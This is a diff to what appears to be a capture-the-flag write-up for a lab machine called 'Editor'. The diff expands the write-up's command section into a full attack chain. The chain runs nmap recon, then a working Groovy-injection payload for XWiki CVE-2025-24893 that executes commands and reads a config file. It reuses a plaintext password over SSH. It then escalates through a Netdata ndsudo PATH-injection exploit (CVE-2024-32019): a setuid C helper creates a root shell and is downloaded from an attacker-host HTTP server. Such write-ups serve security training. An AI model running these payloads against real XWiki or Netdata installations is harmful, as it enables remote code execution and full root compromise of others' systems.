@@ -114,17 +114,75 @@ Root/admin access came from the machine's core misconfiguration or vulnerability
 
 ## 🧰 Command Palette
 
-<details>
-<summary><b>Useful commands and technique anchors</b></summary>
+<details open>
+<summary><b>🔎 Recon</b></summary>
 
-- `curl/browser XWiki enumeration on :8080`
-- `CVE-2025-24893 SolrSearch/Groovy payload shape`
-- `cat hibernate.cfg.xml`
-- `sshpass -p 'theEd1t0rTeam99' ssh oliver@<target>`
-- `PATH=/tmp/oliver_path:$PATH ndsudo ...`
-- `/tmp/rootshell -p -c 'id; cat /root/root.txt'`
+```bash
+sudo nmap -sC -sV -Pn -p- -oN nmap_full.txt 10.129.231.23
+sudo nmap -sC -sV -Pn -p 22,80,8080 -oN nmap_tcp.txt 10.129.231.23
+echo '10.129.231.23 editor.htb wiki.editor.htb' | sudo tee -a /etc/hosts
+curl -i http://editor.htb/
+curl -i http://editor.htb:8080/
+```
 
 </details>
+
+<details open>
+<summary><b>🧪 XWiki CVE-2025-24893 RCE</b></summary>
+
+```bash
+# Confirm XWiki/SolrSearch surface
+curl -s 'http://editor.htb:8080/xwiki/bin/view/Main/' | grep -i xwiki
+
+# Payload shape: Groovy injection through vulnerable XWiki search endpoint
+curl -sG 'http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch' \
+  --data-urlencode 'media=rss' \
+  --data-urlencode 'text={{async}}{{groovy}}println("id".execute().text){{/groovy}}{{/async}}'
+
+# Use RCE to inspect config
+curl -sG 'http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch' \
+  --data-urlencode 'media=rss' \
+  --data-urlencode 'text={{async}}{{groovy}}println("cat /etc/xwiki/hibernate.cfg.xml".execute().text){{/groovy}}{{/async}}'
+```
+
+</details>
+
+<details open>
+<summary><b>🔐 Config Credential Reuse</b></summary>
+
+```bash
+# Credential recovered from XWiki configuration
+sshpass -p 'theEd1t0rTeam99' ssh -o StrictHostKeyChecking=no oliver@10.129.231.23 'id; hostname'
+sshpass -p 'theEd1t0rTeam99' ssh oliver@10.129.231.23 'sudo -l 2>/dev/null; find / -perm -4000 -type f 2>/dev/null | head -50'
+```
+
+</details>
+
+<details open>
+<summary><b>👑 CVE-2024-32019 ndsudo PATH Injection</b></summary>
+
+```bash
+# Find vulnerable Netdata helper
+sshpass -p 'theEd1t0rTeam99' ssh oliver@10.129.231.23 \
+  'ls -l /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo'
+
+# Build malicious helper named after binary ndsudo resolves via PATH
+cat > nvme.c <<'EOF'
+#include <unistd.h>
+#include <stdlib.h>
+int main(){ setuid(0); setgid(0); system("cp /bin/bash /tmp/rootshell; chmod 6777 /tmp/rootshell"); return 0; }
+EOF
+x86_64-linux-gnu-gcc nvme.c -o nvme
+python3 -m http.server 8081
+
+# Transfer and trigger
+sshpass -p 'theEd1t0rTeam99' ssh oliver@10.129.231.23 'mkdir -p /tmp/oliver_path; curl -o /tmp/oliver_path/nvme http://<attacker-ip>:8081/nvme; chmod +x /tmp/oliver_path/nvme'
+sshpass -p 'theEd1t0rTeam99' ssh oliver@10.129.231.23 'export PATH=/tmp/oliver_path:$PATH; /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list'
+sshpass -p 'theEd1t0rTeam99' ssh oliver@10.129.231.23 '/tmp/rootshell -p -c "id; cat /root/root.txt"'
+```
+
+</details>
+
 
 ---
 
